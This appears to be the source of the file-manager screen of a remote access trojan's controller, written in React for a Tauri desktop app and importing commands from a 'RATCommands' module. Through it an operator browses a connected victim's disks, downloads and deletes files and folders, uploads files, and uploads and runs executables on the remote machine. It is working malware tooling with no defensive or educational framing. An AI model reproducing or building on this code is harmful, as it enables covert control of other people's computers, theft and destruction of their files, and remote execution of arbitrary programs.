import { useEffect, useState, useRef } from "react";
import { useParams } from "react-router-dom";
import { FileType } from "../../types";
import {
  readFilesCmd,
  manageFileCmd,
  uploadAndExecute,
  executeFile,
} from "../rat/RATCommands";
import { listen } from "@tauri-apps/api/event";
import { open } from "@tauri-apps/plugin-dialog";
import {
  IconFolderFilled,
  IconFileFilled,
  IconArrowLeft,
  IconDownload,
  IconTrash,
  IconFileTypeZip,
  IconFileBarcode,
  IconFileMusic,
  IconFileTypeTxt,
  IconFileTypePdf,
  IconFileTypePng,
  IconFileTypeDoc,
  IconFileTypeXls,
  IconFileTypePpt,
  IconFileCode,
  IconFolders,
  IconSearch,
  IconFileDescription,
  IconUpload,
  IconPlayerPlay,
  IconDotsVertical,
  IconFileUpload,
} from "@tabler/icons-react";
import { invoke } from "@tauri-apps/api/core";

export const FileManager = () => {
  const { addr } = useParams();
  const [path, setPath] = useState("");
  const [files, setFiles] = useState<Array<FileType> | null>(null);
  const [folderFilter, setFolderFilter] = useState("");
  const [fileFilter, setFileFilter] = useState("");
  const [loading, setLoading] = useState(false);
  const [contextMenu, setContextMenu] = useState<{
    visible: boolean;
    x: number;
    y: number;
    fileName: string;
  }>({ visible: false, x: 0, y: 0, fileName: "" });

  const filesRef = useRef<HTMLDivElement>(null);
  const foldersRef = useRef<HTMLDivElement>(null);
  const contextMenuRef = useRef<HTMLDivElement>(null);

  function fileActions(type: string, fileName: string) {
    if (type === "file")
      return (
        <div className="flex flex-row gap-1 justify-center w-full">
          <button
            className="cursor-pointer px-2 py-1 bg-secondarybg text-gray-200 hover:bg-accentx hover:text-white border border-gray-700 rounded flex items-center gap-1 text-xs font-medium transition-colors"
            onClick={(e) => {
              e.stopPropagation();
              manageFile("download_file", fileName);
            }}
            title="Download File"
          >
            <IconDownload size={14} />
            <span className="hidden sm:inline">Download</span>
          </button>

          <button
            className="cursor-pointer px-2 py-1 bg-red-900 text-white hover:bg-red-700 rounded flex items-center gap-1 text-xs font-medium transition-colors"
            onClick={(e) => {
              e.stopPropagation();
              manageFile("remove_file", fileName);
            }}
            title="Delete File"
          >
            <IconTrash size={14} />
            <span className="hidden sm:inline">Delete</span>
          </button>
        </div>
      );
    return null;
  }

  useEffect(() => {
    invoke("read_files", { addr, run: "available_disks", path: "disks" });
  }, []);

  useEffect(() => {
    // Handle clicks outside the context menu
    const handleClickOutside = (event: MouseEvent) => {
      if (
        contextMenuRef.current &&
        !contextMenuRef.current.contains(event.target as Node)
      ) {
        setContextMenu((prev) => ({ ...prev, visible: false }));
      }
    };

    document.addEventListener("mousedown", handleClickOutside);
    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, []);

  useEffect(() => {
    let unlisten = listen("files_result", (event: any) => {
      console.log(event);
      if (event.payload.addr === addr) {
        console.log(event.payload.files);
        setFiles(event.payload.files);
        setLoading(false);
      }
    });

    return () => {
      unlisten.then((fn) => fn());
    };
  }, []);

  useEffect(() => {
    let unlisten = listen("current_folder", (event: any) => {
      if (event.payload.addr === addr) {
        setPath(event.payload.path);
        if (filesRef.current)
          filesRef.current.scrollIntoView({ behavior: "smooth" });
        if (foldersRef.current)
          foldersRef.current.scrollIntoView({ behavior: "smooth" });
      }
    });

    return () => {
      unlisten.then((fn) => fn());
    };
  }, []);

  async function fetchFolder(folder: string) {
    setLoading(true);
    let run =
      folder === "previous"
        ? "previous_dir"
        : folder === "disks"
        ? "available_disks"
        : "view_dir";

    await readFilesCmd(addr, run, folder);
  }

  async function manageFile(command: string, fileName: string) {
    await manageFileCmd(addr, command, fileName);
  }

  async function executeRemoteFile(fileName: string) {
    if (path) {
      const fullPath = `${path}\\${fileName}`;
      await executeFile(addr, fullPath);
    }
  }

  async function uploadAndExecuteFile() {
    const selected = await open({
      multiple: false,
      filters: [{ name: "Executable", extensions: ["exe"] }],
    });

    if (selected && !Array.isArray(selected)) {
      await uploadAndExecute(addr, selected);
    }
  }

  async function uploadFileToCurrentFolder() {
    if (!path) {
      alert("Please navigate to a folder first");
      return;
    }

    const selected = await open({
      multiple: false,
      title: "Select a file to upload",
    });

    if (selected && !Array.isArray(selected)) {
      try {
        // Read the file content
        const fileData = await invoke("read_file_for_upload", {
          filePath: selected,
        });

        // Get just the filename from the path
        const fileName = selected.split(/[\\\/]/).pop();

        // Send the file to the client
        await invoke("upload_file_to_folder", {
          addr,
          targetFolder: path,
          fileName,
          fileData,
        });

        // Refresh the directory after upload
        await readFilesCmd(addr, "view_dir", path.split("\\").pop() || "");
      } catch (error) {
        console.error("Failed to upload file:", error);
        alert("Failed to upload file: " + error);
      }
    }
  }

  const handleContextMenu = (e: React.MouseEvent, fileName: string) => {
    e.preventDefault();

    // Get the position for the context menu
    const x = e.clientX;
    const y = e.clientY;

    // Set the context menu information
    setContextMenu({
      visible: true,
      x,
      y,
      fileName,
    });
  };

  function fileExtension(fileName: string) {
    if (
      fileName.includes(".rar") ||
      fileName.includes(".zip") ||
      fileName.includes(".7z")
    )
      return <IconFileTypeZip size={24} className="text-blue-400" />;
    if (
      fileName.includes(".mp4") ||
      fileName.includes(".mkv") ||
      fileName.includes(".avi")
    )
      return <IconFileBarcode size={24} className="text-purple-400" />;
    if (
      fileName.includes(".mp3") ||
      fileName.includes(".wav") ||
      fileName.includes(".flac")
    )
      return <IconFileMusic size={24} className="text-green-400" />;
    if (
      fileName.includes(".jpg") ||
      fileName.includes(".jpeg") ||
      fileName.includes(".png") ||
      fileName.includes(".gif")
    )
      return <IconFileTypePng size={24} className="text-yellow-400" />;
    if (fileName.includes(".txt"))
      return <IconFileTypeTxt size={24} className="text-gray-400" />;
    if (fileName.includes(".pdf"))
      return <IconFileTypePdf size={24} className="text-red-400" />;
    if (fileName.includes(".doc") || fileName.includes(".docx"))
      return <IconFileTypeDoc size={24} className="text-blue-400" />;
    if (fileName.includes(".xls") || fileName.includes(".xlsx"))
      return <IconFileTypeXls size={24} className="text-green-400" />;
    if (fileName.includes(".ppt") || fileName.includes(".pptx"))
      return <IconFileTypePpt size={24} className="text-orange-400" />;
    if (
      fileName.includes(".html") ||
      fileName.includes(".css") ||
      fileName.includes(".js")
    )
      return <IconFileCode size={24} className="text-cyan-400" />;

    return <IconFileFilled size={24} className="text-gray-400" />;
  }

  const filteredFolders =
    files
      ?.filter((f) => f.file_type === "dir")
      .filter(
        (f) =>
          f.name !== "../" &&
          f.name.toLowerCase().includes(folderFilter.toLowerCase())
      ) || [];

  const filteredFiles =
    files
      ?.filter((f) => f.file_type === "file")
      .filter((f) => f.name.toLowerCase().includes(fileFilter.toLowerCase())) ||
    [];

  return (
    <div className="p-6 w-full h-screen bg-primarybg flex flex-col overflow-hidden">
      {/* Context Menu */}
      {contextMenu.visible && (
        <div
          ref={contextMenuRef}
          className="fixed z-50 bg-secondarybg border border-gray-700 rounded-md shadow-xl"
          style={{ top: contextMenu.y, left: contextMenu.x }}
        >
          <ul>
            <li
              className="px-4 py-2 hover:bg-accentx hover:text-white flex items-center gap-2 cursor-pointer text-sm"
              onClick={() => {
                executeRemoteFile(contextMenu.fileName);
                setContextMenu((prev) => ({ ...prev, visible: false }));
              }}
            >
              <IconPlayerPlay size={16} /> Execute File
            </li>
            <li
              className="px-4 py-2 hover:bg-accentx hover:text-white flex items-center gap-2 cursor-pointer text-sm"
              onClick={() => {
                manageFile("download_file", contextMenu.fileName);
                setContextMenu((prev) => ({ ...prev, visible: false }));
              }}
            >
              <IconDownload size={16} /> Download File
            </li>
            <li
              className="px-4 py-2 hover:bg-red-900 hover:text-white flex items-center gap-2 cursor-pointer text-sm"
              onClick={() => {
                manageFile("remove_file", contextMenu.fileName);
                setContextMenu((prev) => ({ ...prev, visible: false }));
              }}
            >
              <IconTrash size={16} /> Delete File
            </li>
          </ul>
        </div>
      )}

      {/* Header */}
      <div className="flex justify-between items-center mb-6">
        <div className="flex items-center gap-2">
          <IconFolders size={28} className="text-accentx" />
          <h2 className="text-xl font-medium text-white">File Manager</h2>
        </div>

        <div className="flex items-center gap-3">
          <button
            className="cursor-pointer px-3 py-1.5 bg-accentx text-white hover:bg-opacity-80 rounded flex items-center gap-1.5 text-xs font-medium transition-colors"
            onClick={uploadAndExecuteFile}
            title="Upload & Execute File"
          >
            <IconUpload size={14} />
            Upload & Execute
          </button>

          <button
            className="cursor-pointer px-3 py-1.5 bg-blue-600 text-white hover:bg-blue-700 rounded flex items-center gap-1.5 text-xs font-medium transition-colors"
            onClick={uploadFileToCurrentFolder}
            title="Upload File to Current Folder"
          >
            <IconFileUpload size={14} />
            Upload File
          </button>

          <div className="text-sm text-gray-400 max-w-lg truncate">
            <span className="text-white mr-1">Current path:</span>{" "}
            {path || "Loading..."}
          </div>
        </div>
      </div>

      <div className="flex gap-4 w-full flex-1 overflow-hidden">
        {/* Folders Section */}
        <div className="w-[320px] bg-secondarybg rounded-xl overflow-hidden flex flex-col h-full">
          <div className="flex items-center justify-between p-4 border-b border-gray-800">
            <h3 className="text-base font-medium text-white">Folders</h3>
            <div className="relative w-36">
              <div className="absolute inset-y-0 left-0 flex items-center pl-2 pointer-events-none">
                <IconSearch size={14} className="text-gray-400" />
              </div>
              <input
                value={folderFilter}
                onChange={(e) => setFolderFilter(e.target.value)}
                type="text"
                className="pl-7 pr-2 py-1 w-full text-xs bg-primarybg rounded-md border border-gray-700 focus:border-accentx focus:outline-none"
                placeholder="Filter folders"
              />
            </div>
          </div>

          <div className="p-3">
            {/* Back button */}
            <div
              onClick={() => fetchFolder("previous")}
              className="flex items-center gap-3 cursor-pointer hover:bg-accentx hover:text-white p-2 rounded-lg transition mb-3 bg-primarybg group"
            >
              <IconArrowLeft
                size={24}
                className="text-accentx group-hover:text-white"
              />
              <span className="text-base font-medium">../</span>
            </div>
          </div>

          {/* Folder list */}
          <div
            ref={foldersRef}
            className="overflow-y-auto flex-1 p-3 pt-0 space-y-2"
          >
            {loading && filteredFolders.length === 0 ? (
              <div className="text-center py-8 text-gray-400">
                <IconFolderFilled
                  size={30}
                  className="mx-auto mb-2 animate-pulse text-gray-500"
                />
                <p>Loading folders...</p>
              </div>
            ) : filteredFolders.length > 0 ? (
              filteredFolders.map((file) => (
                <div key={file.name}>
                  <div
                    className="flex items-center justify-between bg-primarybg hover:bg-accentx hover:text-white transition p-3 rounded-lg cursor-pointer group"
                    onClick={() => fetchFolder(file.name)}
                  >
                    <div className="flex items-center gap-2 truncate">
                      <IconFolderFilled
                        size={24}
                        className="text-accentx group-hover:text-white"
                      />
                      <span className="truncate" title={file.name}>
                        {file.name}
                      </span>
                    </div>

                    <button
                      className="opacity-0 group-hover:opacity-100 cursor-pointer px-2 py-1 bg-red-900 text-white hover:bg-red-700 rounded flex items-center gap-1 text-xs font-medium transition-all"
                      onClick={(e) => {
                        e.stopPropagation();
                        manageFile("remove_dir", file.name);
                      }}
                      title="Delete Folder"
                    >
                      <IconTrash size={12} />
                    </button>
                  </div>
                </div>
              ))
            ) : folderFilter ? (
              <div className="text-center py-8 text-gray-400">
                <IconSearch size={30} className="mx-auto mb-2 text-gray-500" />
                <p>No folders match your filter</p>
              </div>
            ) : (
              <div className="text-center py-8 text-gray-400">
                <IconFolderFilled
                  size={30}
                  className="mx-auto mb-2 text-gray-500"
                />
                <p>No folders found</p>
              </div>
            )}
          </div>
        </div>

        {/* Files Section */}
        <div
          ref={filesRef}
          className="flex-1 bg-secondarybg rounded-xl overflow-hidden flex flex-col h-full"
        >
          <div className="flex items-center justify-between p-4 border-b border-gray-800">
            <h3 className="text-base font-medium text-white">Files</h3>
            <div className="relative w-36">
              <div className="absolute inset-y-0 left-0 flex items-center pl-2 pointer-events-none">
                <IconSearch size={14} className="text-gray-400" />
              </div>
              <input
                value={fileFilter}
                onChange={(e) => setFileFilter(e.target.value)}
                type="text"
                className="pl-7 pr-2 py-1 w-full text-xs bg-primarybg rounded-md border border-gray-700 focus:border-accentx focus:outline-none"
                placeholder="Filter files"
              />
            </div>
          </div>

          <div className="overflow-y-auto flex-1 p-4">
            {loading && filteredFiles.length === 0 ? (
              <div className="text-center py-12 text-gray-400">
                <IconFileDescription
                  size={36}
                  className="mx-auto mb-3 animate-pulse text-gray-500"
                />
                <p>Loading files...</p>
              </div>
            ) : filteredFiles.length > 0 ? (
              <div className="grid grid-cols-[repeat(auto-fill,minmax(200px,1fr))] gap-4">
                {filteredFiles.map((file) => (
                  <div
                    key={file.name}
                    className="flex flex-col justify-between p-4 bg-primarybg rounded-lg hover:bg-gray-800 transition group relative"
                    onContextMenu={(e) => handleContextMenu(e, file.name)}
                  >
                    <div className="absolute top-2 right-2">
                      <button
                        className="w-8 h-8 rounded-full opacity-0 group-hover:opacity-100 bg-gray-700 hover:bg-accentx flex items-center justify-center transition-all text-white"
                        onClick={(e) => {
                          e.stopPropagation();
                          const rect = e.currentTarget.getBoundingClientRect();
                          setContextMenu({
                            visible: true,
                            x: rect.right,
                            y: rect.bottom,
                            fileName: file.name,
                          });
                        }}
                      >
                        <IconDotsVertical size={16} />
                      </button>
                    </div>
                    <div className="mb-3 flex justify-center">
                      {fileExtension(file.name)}
                    </div>
                    <div className="mb-4 w-full text-center" title={file.name}>
                      <span className="block truncate px-2">{file.name}</span>
                    </div>
                    <div className="flex flex-col">
                      <div className="text-center mb-2 text-xs text-gray-400">
                        <em>Right-click for more options</em>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            ) : fileFilter ? (
              <div className="text-center py-12 text-gray-400">
                <IconSearch size={36} className="mx-auto mb-3 text-gray-500" />
                <p>No files match your filter</p>
              </div>
            ) : (
              <div className="text-center py-12 text-gray-400">
                <IconFileDescription
                  size={36}
                  className="mx-auto mb-3 text-gray-500"
                />
                <p>No files in this directory</p>
              </div>
            )}
          </div>

          {filteredFiles.length > 0 && (
            <div className="px-4 py-2 text-xs text-gray-400 border-t border-gray-800">
              Showing {filteredFiles.length}{" "}
              {filteredFiles.length === 1 ? "file" : "files"}
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
